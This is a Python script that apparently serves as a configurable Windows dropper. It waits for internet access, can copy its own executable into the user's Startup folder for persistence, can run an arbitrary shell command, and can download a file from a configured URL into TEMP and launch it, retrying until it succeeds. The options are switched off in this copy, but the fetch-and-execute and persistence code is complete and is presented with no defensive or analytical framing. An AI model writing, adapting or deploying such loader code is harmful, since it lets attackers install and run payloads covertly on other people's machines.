import subprocess
import requests
import socket
import shutil
import time
import sys
import os

enable_startup_copy = False
custom_command = False
download_url = False

downloaded_file_path = None

if download_url:
    downloaded_file_name = os.path.basename(f"{download_url}")
    downloaded_file_path = os.path.join(os.getenv("TEMP"), downloaded_file_name)


def wait_internet_connection():
    while True:
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=5)
            return True
        except OSError:
            time.sleep(20)
            pass


print("Waiting for an internet connection...")
wait_internet_connection()

print("Internet connection established.")

if enable_startup_copy:
    try:
        startup_folder_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs",
                                           "Startup")
        shutil.copy(sys.executable, startup_folder_path)
        print("Copied to startup successful.")
    except Exception as startup_error:
        print(f"Error during startup setup: {startup_error}")

if custom_command:
    try:
        subprocess.run(f"{custom_command}", shell=True, check=True)
    except subprocess.CalledProcessError as command_error:
        print(f"Error executing custom command: {command_error}")
    except Exception as generic_error:
        print(f"Error: {generic_error}")

if download_url:
    while True:
        try:
            response = requests.get(f"{download_url}")
            with open(downloaded_file_path, 'wb') as file:
                file.write(response.content)
            print(f"Download successful. File saved at: {downloaded_file_path}")
            os.popen(f"start {downloaded_file_path}")
            break
        except Exception as download_error:
            print(f"Error: {download_error}")
            time.sleep(20)
            pass
